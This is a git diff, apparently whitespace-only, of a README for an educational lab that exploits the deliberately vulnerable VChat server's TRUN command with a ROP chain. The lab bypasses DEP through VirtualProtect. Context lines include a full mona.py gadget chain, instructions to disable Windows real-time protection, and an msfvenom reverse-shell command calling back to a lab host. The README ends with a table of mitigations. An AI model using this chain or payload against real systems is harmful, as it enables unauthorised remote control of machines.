@@ -1,4 +1,4 @@
-# VChat TRUN Exploit: ROP Chain Exploitation 
+# VChat TRUN Exploit: ROP Chain Exploitation
 > [!NOTE]
 > - The following exploit and its procedures are based on an original [Blog](https://fluidattacks.com/blog/vulnserver-trun-rop/) from fluid attacks.
 > - Disable Windows *Real-time protection* at *Virus & threat protection* -> *Virus & threat protection settings*.
@@ -79,7 +79,7 @@ BOOL VirtualProtect(
 Based on the signature of the `VirtualProtect()` function, there are a few arguments we need to set before calling it. The first is the address of the page region we would like to modify the protection of, followed by the region's size and then the permissions we would like to set. As we are not too concerned with the previous permissions of the region, we just need to set the `lpflOldProtect` value such that we do not overwrite the shellcode we have injected onto the stack.
 
 
-We will need to set up the stack so that it has the following signature when making the function call. In this case, we will use gadgets to load these values in the correct order. 
+We will need to set up the stack so that it has the following signature when making the function call. In this case, we will use gadgets to load these values in the correct order.
 
 > [!IMPORTANT]
 > The stack is drawn such that the lower addresses are located lower in the image; oftentimes, this stack could be oriented in the opposite direction when drawn.
@@ -211,7 +211,7 @@ We will need to set up the stack so that it has the following signature when mak
 
       * *Notice*: The address we chose was on the stack, this is because the stack has READ and WRITE permissions already, so if we were to leave the address we had there before which is located in the *.text* segment, if the code were to execute as is then the VChat server would crash after raising an exception; if it does recover it would later crash when it jumps back to the stack and attempts to execute instructions while DEP is still enabled.
 
-   9. Step through the function for a short time to ensure that it works, once we are sure the function call has occurred correctly we can move onto the next step. 
+   9. Step through the function for a short time to ensure that it works, once we are sure the function call has occurred correctly we can move onto the next step.
 
       <img src="Images/I23.png" width=600>
 
@@ -220,7 +220,7 @@ We will need to set up the stack so that it has the following signature when mak
       <img src="Images/I24.png" width=600>
 ### ROP Chain Generation and Exploitation
 
-6. Now we can generate a ROP chain that will fill the stack with the appropriate values *Dynamically* such that the manual modification of stack values with a debugger is not needed. This will leverage the `PUSHAD` x86 assembly instruction. This single instruction is equivalent to the following set of assembly instructions and shows that it will push all of the General Purpose registers onto the stack. 
+6. Now we can generate a ROP chain that will fill the stack with the appropriate values *Dynamically* such that the manual modification of stack values with a debugger is not needed. This will leverage the `PUSHAD` x86 assembly instruction. This single instruction is equivalent to the following set of assembly instructions and shows that it will push all of the General Purpose registers onto the stack.
 
    1. Examine the actions the `PUSHAD` instruction will take on execution.
    ```
@@ -237,14 +237,14 @@ We will need to set up the stack so that it has the following signature when mak
 
       <img src="Images/I20.png" width=600>
 
-   2. We will want to load the registers in such a way that the stack has the following signature. 
+   2. We will want to load the registers in such a way that the stack has the following signature.
 
       <img src="Images/I21.png" width=600>
 
       * We need to load the `EDI` register with the address of a `RETN` instruction. This is because the first word following the `ESP pointer` will be used as the address we jump to. Since the `EDI` register will be this value, it is easiest to chain to `RETN` instructions together to bypass this problem.
-      * The `ESI` register will hold the address of the `VirtualProtect(...)` function so the second `RETN` instruction will jump to the desired location. 
-      * The `EBP` register will need to contain the Address the `VirtualProtect(...)` function will jump to on completion. 
-      * The `ESP` register will be the value of the `ESP` before all of the operations used to modify the stack, as we can see from the actions it will take listed above. This will be the argument that controls the `lpAddress` value, which specifies the start point of the memory region we would like to modify the permissions of. 
+      * The `ESI` register will hold the address of the `VirtualProtect(...)` function so the second `RETN` instruction will jump to the desired location.
+      * The `EBP` register will need to contain the Address the `VirtualProtect(...)` function will jump to on completion.
+      * The `ESP` register will be the value of the `ESP` before all of the operations used to modify the stack, as we can see from the actions it will take listed above. This will be the argument that controls the `lpAddress` value, which specifies the start point of the memory region we would like to modify the permissions of.
       * The `EBX` register will be the value of `dwSize` which specifies the size of the region we would like to modify the permissions of.
       * The `EDX` register will contain the value of the `flNewProtect` argument which represents the permissions we would like to place on the memory region we have specified.
       * The `ECX` register will contain the value of the `lpflOldProtect` argument which is the address the old status and permissions of the memory region we have specified will be written.
@@ -267,11 +267,11 @@ We will need to set up the stack so that it has the following signature when mak
          # rop chain generated with mona.py - www.corelan.be
          rop_gadgets = [
             #[---INFO:gadgets_to_set_esi:---]
-            0x7699cfcf,  # POP ESI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
+            0x7699cfcf,  # POP ESI # RETN [RPCRT4.dll] ** REBASED ** ASLR
             0x62508128,  # ptr to &VirtualProtect() [IAT essfunc.dll]
-            0x77083491,  # MOV ESI,DWORD PTR DS:[ESI] # ADD AL,0 # MOV EAX,8007007F # RETN 0x18 [KERNELBASE.dll] ** REBASED ** ASLR 
+            0x77083491,  # MOV ESI,DWORD PTR DS:[ESI] # ADD AL,0 # MOV EAX,8007007F # RETN 0x18 [KERNELBASE.dll] ** REBASED ** ASLR
             #[---INFO:gadgets_to_set_ebp:---]
-            0x770988dc,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
+            0x770988dc,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR
             0x41414141,  # Filler (RETN offset compensation)
             0x41414141,  # Filler (RETN offset compensation)
             0x41414141,  # Filler (RETN offset compensation)
@@ -280,32 +280,32 @@ We will need to set up the stack so that it has the following signature when mak
             0x41414141,  # Filler (RETN offset compensation)
             0x625014e6,  # & jmp esp [essfunc.dll]
             #[---INFO:gadgets_to_set_ebx:---]
-            0x77508b1d,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
+            0x77508b1d,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
             0xfffffdff,  # Value to negate, will become 0x00000201
-            0x7692da18,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
-            0x769a80d2,  # XCHG EAX,EBX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
+            0x7692da18,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
+            0x769a80d2,  # XCHG EAX,EBX # RETN [RPCRT4.dll] ** REBASED ** ASLR
             #[---INFO:gadgets_to_set_edx:---]
-            0x7707f452,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
+            0x7707f452,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
             0xffffffc0,  # Value to negate, will become 0x00000040
-            0x76d39914,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
-            0x7743a4b2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
+            0x76d39914,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
+            0x7743a4b2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR
             #[---INFO:gadgets_to_set_ecx:---]
-            0x7678816a,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+            0x7678816a,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR
             0x765e3bf2,  # &Writable location [WS2_32.dll] ** REBASED ** ASLR
             #[---INFO:gadgets_to_set_edi:---]
-            0x7747e114,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
+            0x7747e114,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR
             0x765a77c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
             #[---INFO:gadgets_to_set_eax:---]
-            0x77095618,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
+            0x77095618,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
             0x90909090,  # nop
             #[---INFO:pushad:---]
-            0x76f8af08,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
+            0x76f8af08,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR
          ]
          return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
       # Example Declaration
       rop_chain = create_rop_chain()
       ```
-      * *Note*: We will need to modify the return to be `return b''.join(struct.pack('<I', _) for _ in rop_gadgets)` as without converting it to a byte string, we will receive errors! 
+      * *Note*: We will need to modify the return to be `return b''.join(struct.pack('<I', _) for _ in rop_gadgets)` as without converting it to a byte string, we will receive errors!
 
       1. Click on the black button highlighted below, and enter the address we decided for the `PUSHAD` instruction.
 
@@ -331,7 +331,7 @@ We will need to set up the stack so that it has the following signature when mak
 
          https://github.com/DaintyJet/VChat_TRUN_ROP/assets/60448620/b5d8de53-356d-4400-8ee7-df7bda4be74c
 
-5. Now we can add a payload to our exploit, this can be generated with [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html). 
+5. Now we can add a payload to our exploit, this can be generated with [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).
 
 	```
 	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
@@ -347,8 +347,8 @@ We will need to set up the stack so that it has the following signature when mak
     	* `SHELL`: Shell Variable name.
   	* `-a x86`: Specify the target architecture as `x86`
 	* `--platform windows`: Specify the target platform as Windows
-  	* `-b`: Specifies bad chars and byte values. This is given in the byte values. 
-      	* `\x00\x0a\x0d`: Null char, carriage return, and newline. 
+  	* `-b`: Specifies bad chars and byte values. This is given in the byte values.
+      	* `\x00\x0a\x0d`: Null char, carriage return, and newline.
 
 6. Now, we can modify the exploit program to reflect [exploit2.py](./SourceCode/exploit2.py) and verify that we can acquire a reverse shell!
 
@@ -412,7 +412,7 @@ This section covers a previous error encountered when using a ROP chain generate
    ```
    0x75d1280f,  # ADD EAX,5F580189 # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR
    ```
-   * The problem with this gadget is that it also changes the values inthe ESI, EBX, and EBP registers which had already been set. 
+   * The problem with this gadget is that it also changes the values inthe ESI, EBX, and EBP registers which had already been set.
 
 3. There are different ways to fix the problem. What was done to fix this used the same method to set edx, but with different instructions. You need to search for the following instruction sequence.
    ```
@@ -449,11 +449,11 @@ The mitigations we will be using in the following examination are:
 * [Buffer Security Check (GS)](https://github.com/DaintyJet/VChat_Security_Cookies): Security Cookies are inserted on the stack to detect when critical data such as the base pointer, return address or arguments have been overflowed. Integrity is checked on function return.
 * [Data Execution Prevention (DEP)](https://github.com/DaintyJet/VChat_DEP_Intro): Uses paged memory protection to mark all non-code (.text) sections as non-executable. This prevents shellcode on the stack or heap from being executed, as an exception will be raised.
 * [Address Space Layout Randomization (ASLR)](https://github.com/DaintyJet/VChat_ASLR_Intro): This mitigation makes it harder to locate functions and data structures as their region's starting address will be randomized. This is only done when the process is loaded, and if a DLL has ASLR enabled, its addresses will only be randomized again when it is no longer in use and has been unloaded from memory.
-* [SafeSEH](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates that the exception handler we would like to execute is contained in a table generated at compile time. 
+* [SafeSEH](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates that the exception handler we would like to execute is contained in a table generated at compile time.
 * [SEHOP](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates the integrity of the SEH chain during a runtime check.
-* [Control Flow Guard (CFG)](https://github.com/DaintyJet/VChat_CFG): This mitigation verifies that indirect calls or jumps are performed to locations contained in a table generated at compile time. Examples of indirect calls or jumps include function pointers being used to call a function or if you are using `C++` virtual functions, which would be considered indirect calls as you index a table of function pointers. 
+* [Control Flow Guard (CFG)](https://github.com/DaintyJet/VChat_CFG): This mitigation verifies that indirect calls or jumps are performed to locations contained in a table generated at compile time. Examples of indirect calls or jumps include function pointers being used to call a function or if you are using `C++` virtual functions, which would be considered indirect calls as you index a table of function pointers.
 * [Heap Integrity Validation](https://github.com/DaintyJet/VChat_Heap_Defense): This mitigation verifies the integrity of a heap when operations are performed on the heap itself, such as allocations or frees of heap objects.
-### Individual Defenses: VChat Exploit 
+### Individual Defenses: VChat Exploit
 |Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Address Space Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Control Flow Guard (CFG)|
 |-|-|-|-|-|-|-|-|
 |No Effect| |X | |X |X | X| X| X|
@@ -480,7 +480,7 @@ The mitigations we will be using in the following examination are:
 |-|-|-|-|-|-|-|-|
 |Defense: Buffer Security Check (GS)|X|**No Increase**: ROP Chains are used to bypass DEP.|**Increased Security**: ASLR increases the randomness of the generated security cookie and makes it harder to use ROP Gadgets reliably.|**No Increase**: The SEH feature is not exploited.|**No Increase**: The SEH feature is not exploited.|**No Increase**: The Windows Heap is not exploited.|**No Increase**: Indirect Calls/Jumps are not exploited.| |
 
-> [!NOTE] 
+> [!NOTE]
 > We omit repetitive rows representing ineffective mitigation strategies as their cases are already covered.
 
 ## Test code
